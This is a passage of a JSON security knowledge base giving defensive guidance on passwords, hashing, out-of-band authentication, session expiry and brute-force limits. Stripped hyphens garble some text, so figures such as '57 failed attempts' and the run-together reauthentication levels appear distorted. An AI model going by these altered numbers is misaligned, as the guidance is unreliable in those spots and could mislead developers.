"Solution": "To ensure a properly implemented connection between the Identity Provider and the Relying Parties, it is necessary to validate the session management in both sides. In particular, the Relying Parties have to specify to the IdP the maximum authentication timeframe for inactive sessions. After this period, the IdP has to reauthenticate the subscriber (i.e. the user) again. On the other hand, is up to the IdP to inform the Relying Parties of the last authentication event of a user. With this information, the Relying Parties can determine if they need to force the user to authenticate again. "
},
{
"kbId": 1343,
"title": "Permit Password Change",
"Description": "Users should be able to update their password whenever it is necessary. For example, take in consideration the scenario in which they tend to use the same password for multiple purposes. If this password is leaked, the users have to immediately update their credentials in every application they are registered. Therefore, if the application does not provide an accessible password update functionality to a user, there is the risk that his account may be taken over.",
"Solution": "Applications should provide to the user a functionality that permits the change of its own password. "
},
{
"kbId": 1344,
"title": "Provide Password Strength Checker",
"Description": "Users may tend to choose easy guessable passwords. Therefore, it is suggested to implement a functionality that encourage them to set password of higher complexity. ",
"Solution": "Applications should provide the users a password security meter in occasion of account registration and password change. "
},
{
"kbId": 1345,
"title": "Verify Breached Passwords",
"Description": "Multiple database of leaked credentials have been released during breaches over the years. If users choose passwords already leaked, they are vulnerable to dictionary attacks. ",
"Solution": "Verify that passwords submitted during account registration, login, and password change are checked against a set of breached passwords. In case the password chosen has already been breached, the application must require the user to reenter a nonbreached password. "
},
{
"kbId": 5000,
"title": "Offline Attacks on Passwords",
"Description": "Passwords stored locally are often vulnerable to offline attacks like dictionary attacks(list of commonly known passwords), bruteforce(permutation of all possible combinations) and rainbow tables(generate hashes upfront and do a look up for each hash). Since we belong to a generation of high speed computers performing these attacks is quite a trivial task for the attackers.  ",
"Solution": "The most effective solution to eliminate offline attacks on password is to enforce the use of strong passwords and very prominently use industry recognized hashing algorithms with a salting mechanism. We hash passwords because in the event an attacker gets read access to our database, we do not want him to retrieve the passwords plain text. A salt is a nonsecret, unique value in the database which is appended (depending on the used algorithm) to the password before it gets hashed.Some of the well known hashing algorithms are as follows:MD5 (Crytographically Broken), SHA1 (Crytographically Broken), SHA2, SHA3, PBKDF2, bcrypt (defacto standard) and scrypt. "
},
{
"kbId": 5001,
"title": "Password Hash Salt Length",
"Description": "For secure storage of passwords, it is recommended to hash the passwords with a unique salt. A salt is a nonsecret, unique value in the database which is appended (depending on the used algorithm) to the password before it gets hashed. A salt is used to prevent Rainbow Table lookups (an attack where you compute a table of hashes for passwords). The length of a salt is critical to ensure true randomness and entropy amongst the hashed password and prevent collusion.  ",
"Solution": "Ensure the length of the salt is atleast 32bit, SHALL be generated by an approved random bit generator and chosen arbitrarily to minimize salt value collisions among stored hashes. "
},
{
"kbId": 5002,
"title": "PBKDF2 Iteration Count",
"Description": "PBKDF2, is a function for creating a cryptographic key from a password. The aim of the function is to create a key in such a way that dictionary attacks (where the attacker just tries a range of possible passwords) are unfeasible. To do this, PBKDF2 applies a pseudorandom function (PRF) to the password many times. Additionally, the function can be given a \u201csalt\u201d parameter to make each key derivation operation unique. A developer using PBKDF2 must carefully choose parameter values for the salt, the PRF, and the number of iterations, i.e. the number of times the PRF will be applied to the password when deriving the key.  ",
"Solution": "A application developer using PBKDF2 should ensure the iteration count SHOULD be as large as verification server performance will allow, typically at least 100,000 iterations. "
},
{
"kbId": 5003,
"title": "Bcrypt Work Factor",
"Description": "The attraction of bcrypt is that you can tune its work factor to counter increases in computing technology, so that it''s very slow to bruteforce compared to an MD5/SHA/CRC, all of which are extremely fast to compute. When bcrypt was introduced, the cost factor was 6 for normal users and 8 for super users. Chances are you\u2019re just using the default bcrypt cost factor. Bcryptruby and most other implementations set this to 10, meaning 2^10 key expansion rounds. With advances in computing technology, it is highly recommended to tune the work factor cost periodically to combat brute force attacks.  ",
"Solution": "If a developer uses bcrypt, they should ensure the work factor SHOULD be as large as verification server performance will allow, typically at least 13. "
},
{
"kbId": 5100,
"title": "OOB Unencrypted",
"Description": "In authentication, outofband refers to utilizing two separate networks or channels, one of which being different from the primary network or channel, simultaneously used to communicate between two parties or devices for identifying a user. A cellular network is commonly used for outofband authentication. An example of outofband authentication is when an online banking user is accessing their online bank account with a login and a one time password is sent to their mobile phone via SMS to identify them. The primary channel would be the online login screen where the user enters their login information and the second separate channel would be the cellular network. This added layer of security prevents the likelihood of hackers and malware from compromising access to the complete authentication process.  ",
"Solution": "The most effective solution to eliminate the use of mediums such as unencrypted emails or VOIP and switch to more secure channels or implement mechanisms like mutual TLS authentication between the interacting parties where possible. "
},
{
"kbId": 5101,
"title": "Secure OOB Channel",
"Description": "The essential idea behind outofband authentication is that by using two different channels, authentication systems can guard against fraudulent users that may only have access to one of these channels. One of the most common examples of outofband authentication is in banking transactions. Typically, a customer wishing to do an online bank transaction will be sent an SMS message by cell phone with a password. This way, any hackers or identity thieves that have access through key loggers or other equipment will not be able to access that particular password, because it is sent over a 3G or 4G wireless network instead of being sent over the Internet.It is worthy to ensure the channel between the communicating parties is through a trusted and secure channel.  ",
"Solution": "The most effective solution is to switch to a more secure channel and implement mechanisms like mutual TLS between the interacting parties where possible. "
},
{
"kbId": 5102,
"title": "OOB PIN Expiry",
"Description": "If an application allows the user to attempt for outofband authentication after a set time interval, it increases the chance of an attacker to replay a valid outofband authentication key after successfully compromising the session.  ",
"Solution": "The most effective solution is to reject out of band authentication attempts after 10 minutes and also ensure the outofband authentication key can be used only once. "
},
{
"kbId": 5103,
"title": "OOB Key Used Once",
"Description": "If an application allows the user to attempt for outofband authentication using an old outofband authentication key, it increases the likelihood of replay attacks and can assist in comprising a user session.  ",
"Solution": "The most effective solution is to reject out of band authentication attempts after 10 minutes and also ensure the outofband authentication key can be used only once. The system providing outofband authentication keying material should discard the key once it used. "
},
{
"kbId": 6900,
"title": "Unsafe password reset",
"Description": "Sending passwords or activation key''s in clear text exposes sensitive information.  ",
"Solution": "It is best practice to send a unique url or an URL with a unique parameter that allows the user to be re(activated). Make sure the URL expires in a reasonable time and the URL/parameter becomes invalid once the user has been reactivated. "
},
{
"kbId": 6901,
"title": "Presence of Knowledge",
"Description": "Avoid the use of knowledgebasedanswers(socalled \"secret questions\"). Due to the predominant use of social media, the power of Internet search engines, and access to public records via the Internet, your personal information is only be a few keystrokes away,  allowing an attacker to reset your password or recover sensitive information. ",
"Solution": "As an alternative use verification by phone where the user has to send you the unique key he has received or  implement the use of a one time password service like google authenticator. "
},
{
"kbId": 6902,
"title": "Current Password Exposure",
"Description": "The recovery of cedentials should never reveal or send the current password to the user. ",
"Solution": "It is best practice to send a unique url or an URL with a unique parameter that allows the user to create new credentials. Make sure the URL expires in a reasonable time and the URL/parameter becomes invalid once the user has been reactivated. In addition please note that passwords should not be stored in clear text in the database of an application. Instead it is best practice to store password hashes en verify the hashes when authenticating the user. "
},
{
"kbId": 6903,
"title": "Implement Two Factor Authentication for Password Recovery",
"Description": "To verify the user is who he claims to be in order to recover a forgotten password a two factor authentication mechanism should be implemented. ",
"Solution": "To verify forgotten password, and other recovery paths, use a TOTP (Time Based One Time Password) like google authenticator or other soft token, mobile push, or another offline recovery mechanism. "
},
{
"kbId": 6904,
"title": "Identity Spoofing",
"Description": "It is important to uniquely identify the users of an application for traceability. Therefore it should not be possible to use shared accounts, nor should it be possible to rebind identities to a different identity (spoofing) ",
"Solution": "Verify identities cannot be rebound to a different identity and shared accounts are not present (\"root\", \"admin\", or \"sa\"). Administrative accounts like root, admin, sa,... should not be shared, should be renamed and should not be exposed to the front end of the application. "
},
{
"kbId": 6905,
"title": "Multifcator Authentication Exposure",
"Description": "Once a multifactore authentication factor is lost, damaged, or not working, it is important that identity proofing and binding is performed at the same level as during enrollment. ",
"Solution": "Implement a sign in using alternative methods of authentication like verifying the identity using the email and  phone that are registered with the user''s account.  Once replaced, the verifier MAY use a single factor to rebind the account to the new factor. "
},
{
"kbId": 6906,
"title": "Authentication Factor Notification",
"Description": "The user should be aware of any changes to his multiplefactor authentication. ",
"Solution": "Verify that if an authentication factor is changed or replaced (something you \"know\", like a PIN code or something you \"have\" like a hardware token),  that the user is notified of this event. "
},
{
"kbId": 6907,
"title": "MinimumPasswordLength",
"Description": "Minimum password length ",
"Solution": "With the current GPU power a passwords needs to be at least 12 characters in length.  "
},
{
"kbId": 6908,
"title": "PermitLongPasswords",
"Description": "Passwords of at least 64 characters should be allowed.  The use of password managers should be encouraged and supported by ensuring users can paste into password data entry fields,  thereby enabling the automated use of password managers.  ",
"Solution": "Verify that passwords of 64 characters or longer are permitted. "
},
{
"kbId": 6909,
"title": "Permit Spaces In Passwords",
"Description": "\tBy allowing spaces in passwords, a password can become a passphrase which is almost impossible to crack as long as it is not a common or popular quote. \tAlso adding spaces in a password increases the entropy of your password. ",
"Solution": " \t \tVerify that passwords can contain spaces and truncation is not performed. Consecutive multiple spaces MAY optionally be coalesced. "
},
{
"kbId": 6910,
"title": "Permit Unicode Characters In Passwords",
"Description": "\tWe remember visual information quicker and better comparing to text so a more complex password can be easely remembered. \tFor the moment password crackers don''t consider Emoji''s and kanji characters in their tools, but even if they would (and will in the near future),         using even a single Emoji in addition to a characters or/and numbers makes the range of possible passwords wider, which means it becomes harder to hack. ",
"Solution": " \t \tVerify that Unicode characters are permitted in passwords.  \tA single Unicode code point is considered a character, so 8 emoji or 64 kanji characters should be valid and permitted. "
},
{
"kbId": 6911,
"title": "Change And Validate Current Password",
"Description": "\tThe user should be the only one who knows his password, so if an administrator provides the initial password,  \tthe user should be able to change his password. Also when a user believes the current password has  \tbeen (or might have been) compromised, or as a precautionary measure the user must be able to change his password. \t \tWhen a user changes his password, his current password should be validated.  \tThis prevents an attacker that is able to take control of a valid session, to easily change the victim''s password. ",
"Solution": " \t \tVerify users can change their password, and the change validates the current secret. "
},
{
"kbId": 6912,
"title": "List of compromised passwords",
"Description": "\tThe application should compare the new prospective password against a list that contains values known to be commonlyused, expected, or compromised.  ",
"Solution": " \t \tVerify that new or changed passwords are validated against a list of compromised secrets,  \tand if found to be compromised, the user is prompted to choose another secret. \tYou can include pasword list as the ones found here https://wiki.skullsecurity.org/Passwords and/or \tuse an API that provides a list of compromised secrets as can be found here https://haveibeenpwned.com/API/v2 "
},
{
"kbId": 6913,
"title": "Password Strength Indicator",
"Description": "\tPassword strength meters are intended to motivate users to create stronger passwords in the interest of  \ttightening security. The motivating effect is especially high when showing a score numerically and relative  \tto other users. ",
"Solution": " \t \tVerify that a password strength meter/indicator is provided to help users set a stronger secret. "
},
{
"kbId": 6914,
"title": "No Character type limitation",
"Description": "\tThe application should allow and not limit or enforce the type of characters that are permitted.  \tMoreover, the application should enable the user to make pass phrases containng any usable character and  \ttherefore strengthen security.  ",
"Solution": " \t \tVerify that there are no password composition rules limiting the type of characters permitted.  \tThere should be no requirement for upper or lower case or numbers or special characters. "
},
{
"kbId": 6915,
"title": "No Credential Rotation Requirements",
"Description": "\tDo not require that memorized secrets be changed arbitrarily (e.g., periodically) \tunless there is a user request or evidence of authenticator compromise.  \tPassword expiration policies do more harm than good, because these policies drive users to very \tpredictable passwords composed of sequential words and numbers which are closely related to each \tother (that is, the next password can be predicted based on the previous password). Password change \toffers no containment benefits cyber criminals almost always use credentials as soon as they \tcompromise them. \tMandated password changes are a longstanding security practice, but current research strongly \tindicates that password expiration has a negative effect.  ",
"Solution": " \t \tVerify that there are no arbitrary or periodic credential rotation requirements. "
},
{
"kbId": 7000,
"title": "Logout session expiration",
"Description": "Once the user hits the logout button or is logged out by inacitivity, it''s expected the application terminates user''s session and expires session identifiers properly. However, there are situations in which the application simply redirects the user to the logon page. Also, the modern applications relies on client side storage, as cache files, browser session storage, cookies as IndexedDB which may contain session related and sensitive information. Yet, complex applications relying on singlesignon(SSO) mechanisms may leave the source application sesssion as open. In the described scenarios, one attacker accessing a shared computer or using an unattended computer can resume the session and operate the application on the user''s behalf.  ",
"Solution": "Verify that absolute and timeout logout invalidates or erases any client or serverside session storage, such that the back button or a downstream relying party does not resume an authenticated session, including across relying parties. Also, verify that session identifiers are expired and can''t be reused. "
},
{
"kbId": 7001,
"title": "Reauthentication valid sessions",
"Description": "If the application allows the user to remain authenticated for a long period of time, for example \"Stay logged in\" functionality, which prolongs user session longer than the regular serverside timeouts, it increases the chance of an attacker to replay a valid session after successfully compromising the session.   ",
"Solution": "Implement periodical reauthentication both when actively used or after an idle period, making sure the session identifiers are also renewed. Level 1  30 days Level 2  12 hours or 30 minutes of inactivity, 2FA optional Level 3  12 hours or 15 minutes of inactivity, with 2FA "
},
{
"kbId": 7002,
"title": "Change password session expiration",
"Description": "In case the user session is not terminated after a major user profile modification such as a role modification or password change, the user session and profile won''t be in the most updated state. If the user password is compromised, an attacker will be able to operate the application on behalf of the user while the session remains valid, even after the password is changed.  ",
"Solution": "After a successful password change process, terminate all other active sessions, and this is effective across the application, federated login (if present) and any relying parties. "
},
{
"kbId": 7003,
"title": "Samesite cookie attribute",
"Description": "The ''SameSite'' cookie attribute helps developers to control if a cookie can be sent along in requests initiated by thirdparty sites or crosssite requests, helping to prevent CrossSiteRequestForgery(CSRF) type of attacks. The attribute accepts 2 values: strict and lax.  strict: The cookie will NOT be transmitted within requests initiated by thirdparty sites, even if initiated by a GET request.  lax: The cookie will be sent along with GET request only if a Top Level Navigation occurs.  ",
"Solution": "When creating a new cookie in browser, add the ''SameSite'' attribute. "
},
{
"kbId": 8000,
"title": "Weak revocability of physical authenticators",
"Description": "The physical authenticators are very powerful and have some advantages, still they must be considered as compromised, if they were stolen or disappeared. In this case the user (owner of the physical token) needs to get these tokens revoked.  If the revocation process it not effective, then the attacker could use it on behalf of the owner and could get access to their resources. ",
"Solution": "Ensure that revocation is immediately effective across all Identity Providers and Relying Parties. "
},
{
"kbId": 8001,
"title": "Lack of Bruteforce Protection",
"Description": "Every password is hackable. Even the stronger ones, as well. The technique name is bruteforce. In case the attacker can do several of thousand login attempts to find out the proper password, then just matter of time and he/she will be successful. ",
"Solution": "It is recommended to employ different level of controls, like: rate limiting, CAPTCHA, increasing delays, IP address restrictions, locking accounts, riskbased restrictions. Verify that no more than 57 failed attempts is possible on a single account. "
},
{
"kbId": 8003,
"title": "Improper Two Factor Authenticators design",
"Description": "In case of web applications using only biometric authenticators, or using them at first place is not a security best practice. Asking and validating a data (like passwords) needs to be the first layer of the authentication part, and then the second place the biometric authenticators can be employed.   ",
"Solution": "Verify that biometric authenticators are limited to use only as secondary factors in conjunction with either something the user has and something the user knows. "
},
{
"kbId": 8004,
"title": "Impersonation resistance not sufficent",
"Description": "If the web application has no proper impersonation resistance against phishing attacks then the users could be an easy target for attackers. ",
"Solution": "It is recommended to employ one (or more) of the followings: multifactor authentication, cryptographic devices with intent (such as connected keys with a push to authenticate), or clientside certificates. "} ]
}